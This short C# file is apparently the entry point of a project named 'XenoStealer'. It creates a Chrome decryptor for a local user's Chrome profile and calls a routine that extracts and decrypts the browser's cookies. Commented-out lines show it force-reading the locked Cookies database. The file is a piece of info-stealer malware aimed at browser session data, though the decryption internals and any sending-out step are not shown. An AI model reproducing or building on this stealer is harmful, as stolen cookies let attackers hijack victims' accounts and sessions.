using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using XenoStealer;

namespace XenoStealer
{
    class Program
    {
        public static void Main(string[] args)
        {
            ChromeDecryptor a = new ChromeDecryptor(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data");

            var t=Chromium.GetCookies(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default", a);
            var y = 0;
            //Utils.GetProcessLockingFile(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies", out var asd);

            
            //byte[] data=Utils.ForceReadFile(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies");
            //bool h = g;

        }
    }
}